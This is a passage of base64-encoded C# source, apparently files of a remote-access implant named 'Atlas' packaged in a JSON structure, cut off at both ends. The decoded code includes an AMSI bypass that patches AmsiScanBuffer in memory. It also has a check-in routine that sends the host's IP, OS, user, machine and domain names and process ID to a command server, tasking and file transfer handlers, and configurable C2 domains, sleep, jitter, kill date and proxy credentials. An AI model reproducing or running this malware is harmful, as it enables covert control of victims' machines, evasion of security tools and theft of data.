NpemUpXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IGZpbGVfY2h1bmsuTGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVTdHJlYW0uUmVhZChmaWxlX2NodW5rLCAwLCBjaHVua19zaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2NodW5rID0gbmV3IGJ5dGVbQ29uZmlnLkNodW5rU2l6ZV07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZVN0cmVhbS5SZWFkKGZpbGVfY2h1bmssIDAsIENvbmZpZy5DaHVua1NpemUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbGVfY2h1bmspOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJFcnJvciByZWFkaW5nIGZpbGUiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBVcGxvYWQoc3RyaW5nIEZpbGUsIHN0cmluZyBDaHVua0RhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGJ5dGVbXSBjaHVua19kYXRhID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENodW5rRGF0YSk7DQogICAgICAgICAgICAgICAgdXNpbmcgKEZpbGVTdHJlYW0gZmlsZVN0cmVhbSA9IG5ldyBGaWxlU3RyZWFtKEZpbGUsIEZpbGVNb2RlLkFwcGVuZCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBmaWxlU3RyZWFtLldyaXRlKGNodW5rX2RhdGEsIDAsIGNodW5rX2RhdGEuTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBTZXRDb25maWcoc3RyaW5nIGFyZykNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IGFyZy5TcGxpdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3dpdGNoIChhcmdzWzBdLlRvU3RyaW5nKCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYXNlICJkb21haW4iOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoYXJnc1sxXSA9PSAiYWRkIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5TZXJ2ZXIgc2VydmVyID0gbmV3IFV0aWxzLlNlcnZlcg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9tYWluID0gYXJnc1syXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnQgPSAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU2VydmVycy5BZGQoc2VydmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKGFyZ3NbMV0gPT0gInJlbW92ZSIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENvbmZpZy5TZXJ2ZXJzLkNvdW50ID09IDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuU2VydmVyIHNlcnZlciBpbiBDb25maWcuU2VydmVycykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNlcnZlci5kb21haW4gPT0gYXJnc1syXSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuU2VydmVycy5SZW1vdmUoc2VydmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhc2UgInNsZWVwIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5TbGVlcCA9IGludC5QYXJzZShhcmdzWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJqaXR0ZXIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkppdHRlciA9IGludC5QYXJzZShhcmdzWzFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJraWxsX2RhdGUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLktpbGxEYXRlID0gYXJnc1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJob3N0X2hlYWRlciI6DQogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuSG9zdEhlYWRlciA9IGFyZ3NbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlcl9hZ2VudCI6DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgdWEgPSBzdHJpbmcuSm9pbigiICIsIGFyZ3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlVzZXJBZ2VudCA9IHVhLlN1YnN0cmluZygxMSk7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicGFyYW0iOg0KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLlBhcmFtID0gYXJnc1sxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJwcm94eSI6DQogICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKGFyZ3NbMV0pDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlX2RlZmF1bHQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXJnc1syXS5Ub0xvd2VyKCkgPT0gImZhbHNlIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkRlZmF1bHRQcm94eSA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkRlZmF1bHRQcm94eSA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiYWRkcmVzcyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eUFkZHJlc3MgPSBhcmdzWzJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VybmFtZSI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eVVzZXIgPSBhcmdzWzJdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwYXNzd29yZCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbmZpZy5Qcm94eVBhc3N3b3JkID0gYXJnc1syXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbHBGaWxlTmFtZSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQW5zaSwgRXhhY3RTcGVsbGluZyA9IHRydWUsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7DQoNCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7DQoNCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBQYXRjaEJ1ZmZlcigpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBwYXRjaDsNCiAgICAgICAgICAgIGlmIChJbnRQdHIuU2l6ZSA9PSA4KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHBhdGNoID0gbmV3IGJ5dGVbNl07DQogICAgICAgICAgICAgICAgcGF0Y2hbMF0gPSAweEI4Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzFdID0gMHg1NzsNCiAgICAgICAgICAgICAgICBwYXRjaFsyXSA9IDB4MDA7DQogICAgICAgICAgICAgICAgcGF0Y2hbM10gPSAweDA3Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzRdID0gMHg4MDsNCiAgICAgICAgICAgICAgICBwYXRjaFs1XSA9IDB4YzM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcGF0Y2ggPSBuZXcgYnl0ZVs4XTsNCiAgICAgICAgICAgICAgICBwYXRjaFswXSA9IDB4Qjg7DQogICAgICAgICAgICAgICAgcGF0Y2hbMV0gPSAweDU3Ow0KICAgICAgICAgICAgICAgIHBhdGNoWzJdID0gMHgwMDsNCiAgICAgICAgICAgICAgICBwYXRjaFszXSA9IDB4MDc7DQogICAgICAgICAgICAgICAgcGF0Y2hbNF0gPSAweDgwOw0KICAgICAgICAgICAgICAgIHBhdGNoWzVdID0gMHhjMjsNCiAgICAgICAgICAgICAgICBwYXRjaFs2XSA9IDB4MTg7DQogICAgICAgICAgICAgICAgcGF0Y2hbN10gPSAweDAwOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgbGlicmFyeSA9IExvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpOw0KICAgICAgICAgICAgICAgIHZhciBhZGRyZXNzID0gR2V0UHJvY0FkZHJlc3MobGlicmFyeSwgIkFtc2lTY2FuQnVmZmVyIik7DQogICAgICAgICAgICAgICAgdWludCBvbGRQcm90ZWN0Ow0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KGFkZHJlc3MsIChVSW50UHRyKXBhdGNoLkxlbmd0aCwgMHg0MCwgb3V0IG9sZFByb3RlY3QpOw0KICAgICAgICAgICAgICAgIE1hcnNoYWwuQ29weShwYXRjaCwgMCwgYWRkcmVzcywgcGF0Y2guTGVuZ3RoKTsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChhZGRyZXNzLCAoVUludFB0cilwYXRjaC5MZW5ndGgsIG9sZFByb3RlY3QsIG91dCBvbGRQcm90ZWN0KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Q29ubmVjdEZhaWxzKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGF0dGVtcHRzID0gIiI7DQogICAgICAgICAgICBmb3JlYWNoIChVdGlscy5TZXJ2ZXIgc2VydmVyIGluIENvbmZpZy5TZXJ2ZXJzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGF0dGVtcHRzICs9IFN0cmluZy5Gb3JtYXQoInswfSA9IHsxfSwgIiwgc2VydmVyLmRvbWFpbiwgc2VydmVyLmNvdW50LlRvU3RyaW5nKCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGF0dGVtcHRzOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgR2V0Q29uZmlnKCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIHNlcnZlcnMgPSAiIjsNCiAgICAgICAgICAgIGZvcmVhY2ggKFV0aWxzLlNlcnZlciBzZXJ2ZXIgaW4gQ29uZmlnLlNlcnZlcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc2VydmVycyArPSBTdHJpbmcuRm9ybWF0KCJ7MH0gIiwgc2VydmVyLmRvbWFpbik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgiRG9tYWluczogezB9XG5TbGVlcDogezF9XG5KaXR0ZXI6IHsyfVxuS2lsbCBEYXRlOiB7M31cbkhvc3QgSGVhZGVyOiB7NH1cblVzZXItQWdlbnQ6IHs1fVxuR0VUIFBhcmFtZXRlcjogezZ9XG5Vc2UgRGVmYXVsdCBQcm94eTogezd9XG5Qcm94eSBBZGRyZXNzOiB7OH1cblByb3h5IFVzZXJuYW1lOiB7OX1cblByb3h5IFBhc3N3b3JkOiB7MTB9XG5GYWlsZWQgQ29ubmVjdGlvbnM6IHsxMX0iLCBzZXJ2ZXJzLCBDb25maWcuU2xlZXAuVG9TdHJpbmcoKSwgQ29uZmlnLkppdHRlci5Ub1N0cmluZygpLCBDb25maWcuS2lsbERhdGUsIENvbmZpZy5Ib3N0SGVhZGVyLCBDb25maWcuVXNlckFnZW50LCBDb25maWcuUGFyYW0sIENvbmZpZy5EZWZhdWx0UHJveHksIENvbmZpZy5Qcm94eUFkZHJlc3MsIENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkLCBHZXRDb25uZWN0RmFpbHMoKSk7DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgS2lsbEpvYihVdGlscy5Kb2JMaXN0IGpvYkxpc3QsIGludCBqb2JOdW0pDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIGpvYiBpbiBqb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoam9iLmpvYl9pZCA9PSBqb2JOdW0pDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGpvYkxpc3Quam9ic1tqb2JOdW1dLnRocmVhZC5BYm9ydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgam9iTGlzdC5qb2JzLlJlbW92ZUF0KGNvdW50KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNvdW50Kys7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRKb2JzKFV0aWxzLkpvYkxpc3Qgam9iTGlzdCkNCiAgICAgICAgew0KICAgICAgICAgICAgc3RyaW5nIGpvYnMgPSAiSm9iIElEXHRUYXNrIElEXHRcdFx0XHRcdENvbW1hbmRcdFx0UGFyYW1ldGVyc1xuLS0tLS0tXHQtLS0tLS0tXHRcdFx0XHRcdC0tLS0tLS1cdFx0LS0tLS0tLS0tXG4iOw0KICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIGpvYiBpbiBqb2JMaXN0LmpvYnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgam9icyArPSBTdHJpbmcuRm9ybWF0KCJ7MH1cdHsxfVx0ezJ9XHRcdHszfVxuIiwgam9iLmpvYl9pZCwgam9iLnRhc2tfaWQsIGpvYi5jb21tYW5kLCBqb2IucGFyYW1ldGVycy5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGpvYnM7DQogICAgICAgIH0NCiAgICB9DQp9DQo="},{"Http_3.5.cs":"77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KI2lmIERFRkFVTFQNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KI2VuZGlmDQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBNaWNyb3NvZnQuV2luMzI7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBIdHRwDQogICAgew0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgQ2hlY2tJbigpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgICAgICAgICAgQ3J5cHRvLkdlblJzYUtleXMoKTsNCiAgICAgICAgICAgICAgICBVdGlscy5HZXRTdGFnZSBHZXRTdGFnZSA9IG5ldyBVdGlscy5HZXRTdGFnZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gInN0YWdpbmdfcnNhIiwNCiAgICAgICAgICAgICAgICAgICAgcHViX2tleSA9IENyeXB0by5HZXRQdWJLZXkoKSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9pZCA9IFV0aWxzLkdldFNlc3Npb25JZCgpDQoNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXNzaW9uSWQgPSBHZXRTdGFnZS5zZXNzaW9uX2lkOw0KICAgICAgICAgICAgICAgIHN0cmluZyBTZXJpYWxpemVkRGF0YSA9IENyeXB0by5FbmNyeXB0U3RhZ2UoVXRpbHMuR2V0U3RhZ2UuVG9Kc29uKEdldFN0YWdlKSk7DQogICAgICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEdldChTZXJpYWxpemVkRGF0YSk7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbmFsX3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KHJlc3VsdCk7DQogICAgICAgICAgICAgICAgVXRpbHMuU3RhZ2VSZXNwb25zZSBTdGFnZVJlc3BvbnNlID0gVXRpbHMuU3RhZ2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQpOw0KICAgICAgICAgICAgICAgIENvbmZpZy50ZW1wVVVJRCA9IFN0YWdlUmVzcG9uc2UudXVpZDsNCiAgICAgICAgICAgICAgICBDb25maWcuUHNrID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhDcnlwdG8uUnNhRGVjcnlwdChDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoU3RhZ2VSZXNwb25zZS5zZXNzaW9uX2tleSkpKTsNCiNlbmRpZg0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW4gQ2hlY2tJbiA9IG5ldyBVdGlscy5DaGVja0luDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSAiY2hlY2tpbiIsDQogICAgICAgICAgICAgICAgICAgIGlwID0gVXRpbHMuR2V0SVBBZGRyZXNzKCksDQogICAgICAgICAgICAgICAgICAgIG9zID0gUmVnaXN0cnkuR2V0VmFsdWUoQCJIS0VZX0xPQ0FMX01BQ0hJTkVcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24iLCAiUHJvZHVjdE5hbWUiLCAiIikuVG9TdHJpbmcoKSArICIgIiArIFJlZ2lzdHJ5LkdldFZhbHVlKEAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uIiwgIlJlbGVhc2VJZCIsICIiKSwNCiAgICAgICAgICAgICAgICAgICAgdXNlciA9IEVudmlyb25tZW50LlVzZXJOYW1lLlRvU3RyaW5nKCksDQogICAgICAgICAgICAgICAgICAgIGhvc3QgPSBFbnZpcm9ubWVudC5NYWNoaW5lTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBFbnZpcm9ubWVudC5Vc2VyRG9tYWluTmFtZS5Ub1N0cmluZygpLA0KICAgICAgICAgICAgICAgICAgICBwaWQgPSBQcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuSWQsDQogICAgICAgICAgICAgICAgICAgIHV1aWQgPSBDb25maWcuUGF5bG9hZFVVSUQsDQogICAgICAgICAgICAgICAgICAgIGFyY2hpdGVjdHVyZSA9IFV0aWxzLkdldEFyY2goKQ0KICAgICAgICAgICAgICAgIH07DQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIHN0cmluZyBGaW5hbFNlcmlhbGl6ZWREYXRhID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKENvbmZpZy5QYXlsb2FkVVVJRCArIFV0aWxzLkNoZWNrSW4uVG9Kc29uKENoZWNrSW4pKSk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgc3RyaW5nIEZpbmFsU2VyaWFsaXplZERhdGEgPSBDcnlwdG8uRW5jcnlwdENoZWNraW4oVXRpbHMuQ2hlY2tJbi5Ub0pzb24oQ2hlY2tJbikpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgdmFyIG5ld19yZXN1bHQgPSBHZXQoRmluYWxTZXJpYWxpemVkRGF0YSk7DQojaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBsYXN0X3Jlc3VsdCA9IENyeXB0by5EZWNyeXB0KG5ld19yZXN1bHQpOw0KI2VuZGlmDQojaWYgREVGQVVMVA0KICAgICAgICAgICAgICAgIFV0aWxzLkNoZWNrSW5SZXNwb25zZSBDaGVja0luUmVzcG9uc2UgPSBVdGlscy5DaGVja0luUmVzcG9uc2UuRnJvbUpzb24obmV3X3Jlc3VsdCk7DQojZWxpZiAoREVGQVVMVF9QU0sgfHwgREVGQVVMVF9FS0UpDQogICAgICAgICAgICAgICAgVXRpbHMuQ2hlY2tJblJlc3BvbnNlIENoZWNrSW5SZXNwb25zZSA9IFV0aWxzLkNoZWNrSW5SZXNwb25zZS5Gcm9tSnNvbihsYXN0X3Jlc3VsdCk7DQojZW5kaWYNCiAgICAgICAgICAgICAgICBDb25maWcuVVVJRCA9IENoZWNrSW5SZXNwb25zZS5pZDsNCiAgICAgICAgICAgICAgICBpZiAoQ2hlY2tJblJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIEdldFRhc2tpbmcoVXRpbHMuSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChVdGlscy5Kb2IgSm9iIGluIEpvYkxpc3Quam9icykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChKb2IudXBsb2FkKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnRvdGFsX2NodW5rcyAhPSBKb2IuY2h1bmtfbnVtKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghSm9iLmNodW5raW5nX3N0YXJ0ZWQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5VcGxvYWRUYXNraW5nIFVwbG9hZFRhc2tpbmcgPSBVdGlscy5VcGxvYWRUYXNraW5nLkZyb21Kc29uKEpvYi5wYXJhbWV0ZXJzKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmZpbGVfaWQgPSBVcGxvYWRUYXNraW5nLmFzc2VtYmx5X2lkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucGF0aCA9IFVwbG9hZFRhc2tpbmcucmVtb3RlX3BhdGg7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlVwbG9hZCBVcGxvYWQgPSBuZXcgVXRpbHMuVXBsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9ICJ1cGxvYWQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg